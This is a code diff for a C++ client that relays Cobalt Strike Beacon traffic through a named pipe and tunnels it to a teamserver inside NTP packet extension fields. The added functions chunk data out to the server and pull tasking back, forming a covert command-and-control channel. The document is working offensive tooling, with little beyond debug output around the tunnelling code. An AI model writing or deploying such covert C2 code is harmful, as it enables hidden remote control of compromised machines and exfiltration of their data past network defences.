@@ -34,7 +34,7 @@ Not the most efficent way to do this, but one of the simplist/clearest.
 */
 std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> clientId) {
 	std::cout << "======================" << std::endl;
-	std::cout << "Started Chunking		" << std::endl;
+	std::cout << "Started sendBeaconDataToTeamserver" << std::endl;
 	std::cout << "======================" << std::endl;
 	//packetDebugger(data);
 	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
@@ -105,12 +105,107 @@ std::vector<uint8_t> sendBeaconDataToTeamserver(std::vector<uint8_t> data, std::
 		NTPPacketParser responsePacketParser = NTPPacketParser(response);
 		//Make sure server says OK when it gets data
 		if (responsePacketParser.getExtensionField() == NtpExtensionField::sizePacketAcknowledge) {
-			std::cout << "[?] Got successful ACK from server.";
+			std::cout << "[?] Got successful ACK from server." << std::endl;
 		}
 		else {
-			std::cout << "[!] Did not get successful ACK from server.";
+			std::cout << "[!] Did not get successful ACK from server." << std::endl;
 		}
 		//Done! 
+
+	}
+	//print full response data
+	std::cout << "[?] Full Data from Responses: ";
+	printHexVector(responseDataBuffer);
+
+	std::cout << "======================" << std::endl;
+	std::cout << "Finished Chunking		" << std::endl;
+	std::cout << "======================" << std::endl;
+
+	//when done looping, return array
+	//std::vector<uint8_t> placehodlerVec = {};
+	return responseDataBuffer;
+}
+
+//Get data from beacon
+
+std::vector<uint8_t> getBeaconDataFromTeamserver(std::vector<uint8_t> data, std::array < uint8_t, 2> extensionField, std::vector<uint8_t> clientId) {
+	std::cout << "======================" << std::endl;
+	std::cout << "Started getBeaconDataFromTeamserver" << std::endl;
+	std::cout << "======================" << std::endl;
+
+
+	/*
+	Need to send inital getBeaconData size packet so we know how much data is coming back, and teh resposne to that will hold how much 
+	*/
+	auto packetToGetSizeOfTeamserverData = NTPPacket();
+	std::vector<uint8_t> emptyVec = {};
+	packetToGetSizeOfTeamserverData.addExtensionField(
+		NtpExtensionField::getDataFromTeamserverSize, //NtpExtensionField::giveMePayload,
+		emptyVec,
+		clientId
+	);
+	std::cout << "[?] Sending getDataFromTeamserverSize packet " << std::endl;
+	std::vector < uint8_t> packetToGetSizeOfTeamserverDataBytes = packetToGetSizeOfTeamserverData.getPacket();
+	std::vector<uint8_t> response = sendChunk(packetToGetSizeOfTeamserverDataBytes);
+
+	//packetDebugger(data);
+	//1. Calculate size of data, (data.size()), then send a sizePacket to server. If OK, continue
+	NTPPacketParser responseSizeClass(response);
+	std::vector<uint8_t> responseSize = responseSizeClass.getExtensionData();
+	uint32_t dataSize = vectorToUint32(responseSize);
+	std::vector<uint8_t> responseDataBuffer = {};
+	int amountOfChunks = (dataSize + Chunk::maxChunkSize - 1) / Chunk::maxChunkSize; //gives you one extra chunk for remainder
+
+	std::cout << "[?] Total Data Size: " << dataSize << std::endl;
+	std::cout << "[?] Max Chunk Size: " << Chunk::maxChunkSize << std::endl;
+	std::cout << "[?] Number of Chunks needed: " << amountOfChunks << std::endl;
+
+
+	//server should now know that the size is size of data to be sent
+	//now we start sending the actual data, with the dataForTeamserver
+	// Loop over each chunk index
+	for (int i = 0; i < amountOfChunks; ++i) { //++i as we want to get the last chunk
+		size_t start = i * Chunk::maxChunkSize; //get how far into the data we need to be to get the chunk
+		size_t end = std::min(start + Chunk::maxChunkSize, static_cast<size_t>(dataSize)); //gets the smaller of the 2, whether that be dataSize, or start+maxChunkSize. TLDR, prevents trying to read outside of func arg provided data buffer (which is only so big)
+
+		std::vector<uint8_t> chunkData(data.begin() + start, data.begin() + end);
+
+		//std::cout << "[" << i << "/" << amountOfChunks << "]" << " ChunkData: ";
+		//printHexVector(chunkData);
+
+		//Print that we're sending a packet, adn what type of packet it is.
+		std::cout << "----------------------" << std::endl;
+		std::cout << "Sending NTP Packet [" << i + 1 << "/" << amountOfChunks << "]" << std::endl;
+		std::cout << "----------------------" << std::endl;
+
+		//creat ntp packet first
+		auto packet = NTPPacket();
+		packet.addExtensionField(
+			NtpExtensionField::getTeamServerData, //Ask server for teamserver data
+			emptyVec,
+			clientId //REPLACE ME WITH REAL SESSION ID
+		);
+
+		//pass full ntp packet 
+		std::vector < uint8_t> packet_bytes = packet.getPacket();
+		//run the debugger directly on the incoming respnose packet
+		packetDebugger(packet_bytes);
+		std::vector<uint8_t> response = sendChunk(packet_bytes);
+
+		//Print that we've received  a packet, and then print debug items below it
+		std::cout << "----------------------" << std::endl;
+		std::cout << "Recieved Response Packet" << std::endl;
+		std::cout << "----------------------" << std::endl;
+		//run the debugger directly on the incoming respnose packet
+		packetDebugger(response);
+
+		//Parse NTP packet, get data out of it (or whatever else is needed)
+		NTPPacketParser responsePacketParser = NTPPacketParser(response);
+		//Get extension data:
+		std::vector<uint8_t> extensionData = responsePacketParser.getExtensionData();
+
+		//take extracted extension data, put into buffer
+		responseDataBuffer.insert(responseDataBuffer.end(), extensionData.begin(), extensionData.end()); // append response to responseBuffer
 
 	}
 	//print full response data
@@ -249,8 +344,9 @@ void pipeStuff(std::vector<uint8_t> clientId) {
 	//again pulled from https://github.com/Cobalt-Strike/External-C2/blob/main/extc2example.c
 	HANDLE handle_beacon = INVALID_HANDLE_VALUE;
 	while (handle_beacon == INVALID_HANDLE_VALUE) {
+		std::cout << "[+] Waiting on pipe to be available..." << std::endl;
 		Sleep(1000);
-		handle_beacon = CreateFileA("\\\\.\\pipe\\foobar", GENERIC_READ | GENERIC_WRITE,
+		handle_beacon = CreateFileA("\\\\.\\pipe\\somepipe", GENERIC_READ | GENERIC_WRITE,
 			0, NULL, OPEN_EXISTING, SECURITY_SQOS_PRESENT | SECURITY_ANONYMOUS, NULL);
 	}
 
@@ -261,13 +357,21 @@ void pipeStuff(std::vector<uint8_t> clientId) {
 	 * relay frames back and forth
 	 */
 	while (TRUE) {
+		//maybe add a pipe cehck to make sure the pipe exists
+
 		/* read from our named pipe Beacon */
-		std::cout << "[?] Attempting to read frame from Pipe";
+		std::cout << "[?] Attempting to read frame from Pipe" <<std::endl;
 		DWORD read = read_frame(handle_beacon, buffer, BUFFER_MAX_SIZE);
 		if (read < 0) {
-			std::cerr << "Error reading from pipe" << std::endl;
+			std::cout << "Error reading from pipe" << std::endl;
 			return;
 		}
+		std::cout << "Read " << read << " bytes from pipe " << std::endl;
+		std::cout << "buffer contents:" <<std::endl;
+		for (size_t i = 0; i < read; ++i) {
+			printf("%02X ", buffer[i]);
+		}
+		printf("\n");
 
 		// Create a vector from the char* data as the NTP class needs it, readis how much data was read. 
 		std::vector<uint8_t> vec(buffer, buffer + read);
@@ -282,19 +386,31 @@ void pipeStuff(std::vector<uint8_t> clientId) {
 			NtpExtensionField::dataForTeamserver,
 			clientId
 		);
-		std::cout << "[?] Data sent to teamserver, now reciving data back";
+		std::cout << "[?] Data sent to teamserver" << std::endl;
 
 		//then need to getBeaconDataFromTeamserver (which will ask the server for the data for this client)
+		std::cout << "[?] Getting data back from Teamserver" << std::endl;
+		std::vector<uint8_t> dataFromTeamserver = getBeaconDataFromTeamserver(
+			vec,
+			NtpExtensionField::dataForTeamserver,
+			clientId
+		);
 
+
+		std::cout << "[?] Theoretical data would be passed back into pipe now - not imlpemented. Next pipe read will hang because of it. " << std::endl;
 		//extract data out from chunker response
-		//NTPPacketParser dataFromTeamserverClass(dataFromTeamserver);
-		//auto dataForBeaconVec = dataFromTeamserverClass.getExtensionData();
+		NTPPacketParser dataFromTeamserverClass(dataFromTeamserver);
+		auto dataForBeaconVec = dataFromTeamserverClass.getExtensionData();
+
+		std::cout << "[?] Data being written to pipe: ";
+		printHexVector(dataForBeaconVec);
+		std::cout << std::endl;
 
 		//convert to const char * as that's what write_frame wants
-		//auto dataForBeacon = reinterpret_cast<char*>(dataForBeaconVec.data());
+		auto dataForBeacon = reinterpret_cast<char*>(dataForBeaconVec.data());
 
 		/* write to our named pipe Beacon */
-		//write_frame(handle_beacon, dataForBeacon, read);
+		write_frame(handle_beacon, dataForBeacon, read);
 	}
 }
 
